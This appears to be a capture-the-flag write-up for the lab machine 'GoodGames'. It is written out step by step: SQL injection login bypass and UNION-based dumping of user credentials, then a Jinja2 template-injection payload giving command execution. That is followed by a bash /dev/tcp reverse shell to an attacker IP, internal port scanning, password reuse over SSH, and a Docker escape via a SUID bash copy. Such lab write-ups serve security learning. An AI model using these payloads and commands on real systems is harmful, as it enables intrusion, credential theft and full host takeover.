# GoodGames
## Reconnaissance 
### Run NmapAutomator
```bash
sudo ./nmapAutomator.sh 10.10.11.130 All
```
* From the result, only port 80 is open.

![1_Nmap](https://user-images.githubusercontent.com/53956303/165654225-3717df75-b32c-486b-9f7b-7fb9251c6850.jpg)
* Add the host to `/etc/hosts`

![2_hosts](https://user-images.githubusercontent.com/53956303/165654255-b703e50d-a20d-404f-acbb-c6c4b594c8a7.jpg)
## Enumeration
## port 80
![3_Port80](https://user-images.githubusercontent.com/53956303/165654261-853eadec-f238-4946-a497-fbdcf3d3a76a.jpg)
### Test for SQLi
* Capture the request for login and try to inject SQL query to bypass the login.
```sql
' or 1=1-- -
```
* As a result, the login is bypassed.

![4 1_bypassed](https://user-images.githubusercontent.com/53956303/165654295-463a46d8-8d8f-4189-b784-fe9f8860d689.jpg)
![4_bypassed](https://user-images.githubusercontent.com/53956303/165654336-47429987-12c2-48ff-9935-9a6e5e98ee1f.jpg)
* When use the "show response in browser", it is redirected to an admin's profile.

![4 5_admin](https://user-images.githubusercontent.com/53956303/165654301-13a068d9-1f2e-4640-bd26-ddf1e109e9ff.jpg)
![5_admin](https://user-images.githubusercontent.com/53956303/165654364-ac3f8619-bf4f-4492-bb29-b3f849bec16d.jpg)
* It means that the SQLi worked. There has no more information from the admin page.
## Exploit
### SQLi to determine the Column number

```bash
' UNION select 1-- -
.
.
1 UNION select 1,2,3,4-- -
```
* When the columns for 4 is tried, an interesting output is given.

![6_output](https://user-images.githubusercontent.com/53956303/165654422-0c35a7d6-0684-410b-98b9-52181e357861.jpg)
### SQLi to determine the database names
```bash
' Union select 1,2,3,concat(schema_name, ':') from information_schema.schemata-- -
```
* From the result, two database names "main" and "information_schema" is found.

![7_dbs](https://user-images.githubusercontent.com/53956303/165654462-b7cee2ba-14c9-4dc7-a746-0af1f173e2c0.jpg)
### SQLi to determine the table names on the "main" db
```bash
' UNION select 1,2,3,concat(table_name, ':') from information_schema.tables where table_schema = 'main'-- -
```
* From the result, three table names are given.

![8_tableNames](https://user-images.githubusercontent.com/53956303/165654487-81d22072-ae44-4a95-9b62-64292bf802f4.jpg)
### SQLi to obtain column names on the "user" table on the "main" db
```bash
' UNION select 1,2,3,concat(column_name, ':') from information_schema.columns where table_name = 'user'-- -
```
* From the result, column names are given.

![9_columnames](https://user-images.githubusercontent.com/53956303/165654495-9e5e4726-e297-4577-a226-aa2f0bdb4b7b.jpg)
### SQLi to extract data from the columns
```bash
' UNION select 1,2,3,concat(id, ':', name, ':', email, ':', password, ':') from user-- -
```
* From the result, some information is given.

![10_info](https://user-images.githubusercontent.com/53956303/165654511-b5e70109-10f1-4738-9293-081a67e89547.jpg)
* Using an online tool, the password is cracked.
    * `admin:superadministrator`

## Initial Foothold
* At the right next to the logout button is connected to a new link `http://internal-administration.goodgaems.htb/login`.
    * Add this to the `/etc/hosts`

![11_host](https://user-images.githubusercontent.com/53956303/165654556-c56bd232-31e6-4a8f-b085-ae4ea66fd05e.jpg)
### internal-administration.goodgames.htb
* From the page, a login panel for Flask is found.

![12_flask](https://user-images.githubusercontent.com/53956303/165654580-8db71842-6350-494d-bcdf-9610d1cc9443.jpg)
* With the obtained password, access to the admin panel is granted.

![13_admin](https://user-images.githubusercontent.com/53956303/165654587-dc21fe97-2ca3-4abd-8cf5-aae7d8ba48da.jpg)
### Test SSTI on the Flask Bolt
* From Google search an [SSTI (Server Side Template Injection) Flask/Jinja2](https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee) by IndominusByte is found.
    * Since that application needs an input point to enter a value to test the SSTI, use the name change panel to test.

![14_name](https://user-images.githubusercontent.com/53956303/165654667-ae64ac51-ea6a-4c9d-b2a0-6b648c932e12.jpg)
* As a result, the username has been chagned to 49 (Multiplication worked), which means that this application is vulnerable to SSTI.

![15_vuln](https://user-images.githubusercontent.com/53956303/165654681-68bf3634-2481-47e2-a2ad-b4b133eca151.jpg)
### Test Jinja2 RCE
* A payload is found from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2)
    * Execute `id` command
```bash
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```
![16_command](https://user-images.githubusercontent.com/53956303/165654725-e1efe820-96eb-43d9-bf10-96e6af4aba83.jpg)
* As a result, the `id` command is executed.

![17_id](https://user-images.githubusercontent.com/53956303/165654739-0fd4b809-b7e2-4297-82bc-6b4a8b8a7e57.jpg)
### Getting a reverse shell
#### Open a Netcat Listener
```bash
sudo nc -lnvp 9090
```
#### Inject Jinja2 RCE to get a reverse shell
```bash
{{ namespace.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.10.14.15/9090 0>&1"').read() }}
```
* As a result, a reverse shell as "root" is open. However, "Dockerfile" indicated that the root user is in a Docker container.
  * Therefore, in order to escalate the privilege, the attacker must escape the docker container.

![18_docker](https://user-images.githubusercontent.com/53956303/165654760-0b5e6f51-c187-4b54-a54e-79544e9a286b.jpg)
## Privilege Escalation; Escape the Docker container
### Getting a stable shell
```bash
python3 -c "import pty;pty.spawn('/bin/bash')"
CTRL + Z
stty raw -echo; fg
```
### Post-Enumeration
* From the `/home` directory, a user `augustus`'s directory is found.
    * However, the augustus user is not in `/etc/passwd` file. It means that the `augustus` user is an user at the host machine. And the directory is mounted.

![19_docker](https://user-images.githubusercontent.com/53956303/165654916-54da6f93-3aa0-48a7-820f-b391aa599f27.jpg)
* Use the mount command to confirm the theory.
```bash
mount | grep augustus
```
* Found! it means that the home directory of `augustus` is mounted!

![20_mount](https://user-images.githubusercontent.com/53956303/165654930-5a827911-7d19-44ac-898c-db4984e3b567.jpg)
### Internal Network Enumeration: Use lieanpe.sh
* Transfer the linpea.sh from the Kali
  * From the Network session, an internal IP address `172.19.0.2` is found.

![21_internal](https://user-images.githubusercontent.com/53956303/165654941-2b6d19ac-b877-475b-a3d1-f5d0a9ac14a8.jpg)
* Confirm with simple python oneliner.
```python
for i in {1..254}; do (ping -c 1 172.19.0.${i} | grep "bytes from" | grep -v "Unreachable" &); done;
```
* Only `172.19.0.2` other than `172.19.0.1` is found.

![22_internal_confir,](https://user-images.githubusercontent.com/53956303/165655032-9da32e08-6b79-4ec7-a276-d630daec47fa.jpg)
### Identify the internally open ports
```python
for port in {1..65535}; do echo > /dev/tcp/172.19.0.1/$port && echo "$port open"; done 2>/dev/null
for port in {1..65535}; do echo > /dev/tcp/172.19.0.2/$port && echo "$port open"; done 2>/dev/null
```
* As a result, some open ports are found.

![23_ports](https://user-images.githubusercontent.com/53956303/165655048-ad5e00b9-70e5-4b11-a273-a876e29dac9b.jpg)
## Try to Connect SSH
* Since SSH is running on `172.19.0.1`, try to connect SSH with the same password for the goodgames and Flask admin page.
    * It works! An SSH shell as `augustus` is opened.

![24_ssh](https://user-images.githubusercontent.com/53956303/165655127-2968902b-52f2-4e27-9237-f8d8a8c75550.jpg)
## Privilege Escalation (augustus => root)
### Post-enumeration
* The home directory of augusuts is the same on the docekr container.
### Make a file on Docker
* See what happen when a file is made in the container.
```bash
# Container
touch test_file
```
![25_made](https://user-images.githubusercontent.com/53956303/165655155-cbd4da8e-c977-4509-a8e6-cc170d1692d9.jpg)
* When the file is viewed as Augustus on the host machine.

* The Host machine considers that the file made by root in the Docker container as the host machine's root!

![26_test](https://user-images.githubusercontent.com/53956303/165655182-692f823d-4b8b-4e60-8224-4f95c513c9df.jpg)
### Spawn a root shell
* Copy the `/bin/bash` and change the permission to SUID as root in the Docker cotainer
```bash
# Host shell as Augustus
cp /bin/bash .

# Root in the Docker container
chown root:root bash
chmod 4777 bash
```
![27_chown](https://user-images.githubusercontent.com/53956303/165655203-a84a7418-da1f-4385-ac72-e864f4a95e29.jpg)
#### Spwan a shell on the host
```bash
./bash -p
```
* As a result, a root shell is open on the host machine.

![28_root](https://user-images.githubusercontent.com/53956303/165655215-575e4d25-a2a6-4c48-89ea-358d74600058.jpg)
